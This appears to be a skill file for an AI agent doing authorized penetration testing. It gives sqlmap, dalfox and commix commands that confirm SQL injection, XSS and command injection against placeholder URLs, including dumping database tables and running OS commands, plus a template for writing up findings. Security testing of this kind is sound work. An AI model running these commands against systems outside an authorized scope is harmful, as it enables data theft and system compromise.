---
name: confirm-injection
description: Prove a SQL injection, XSS, or command injection by firing a working payload, then capture the exact reproduction. Use whenever the task is to confirm or exploit SQLi, XSS, or command injection, or to verify a scanner's injection finding. For authorized testing only. Covers writing each confirmed finding with its reproduction to findings/.
agents: exploiter
---

# A finding is not real until it fires

Confirm it, then reproduce the decisive request by hand so the report has exact
steps.

- SQL injection: `sqlmap -u 'https://example.com/item?id=1' --batch --dbs`
  (`-r req.txt` for a saved request, `--dump` for a table, `--level`/`--risk` to
  widen). `--batch` answers prompts with defaults.
- XSS through to a firing payload:
  `dalfox url 'https://example.com/search?q=test' -o findings/xss.txt`.
- Command injection:
  `commix -u 'https://example.com/ping?host=127.0.0.1' --batch` (`--os-cmd 'id'`
  runs one command instead of opening a shell).
- Reproduce the decisive request with `curl -i '...'` and save it.

## Record it — use this exact structure

Write each confirmed finding to `findings/<name>.md`:

```
# <vuln type> — <affected endpoint or parameter>
## Reproduction
<the exact request or command that fires it>
## Impact
<what it lets an attacker do>
```

Report the file paths, not a dump of tool output.
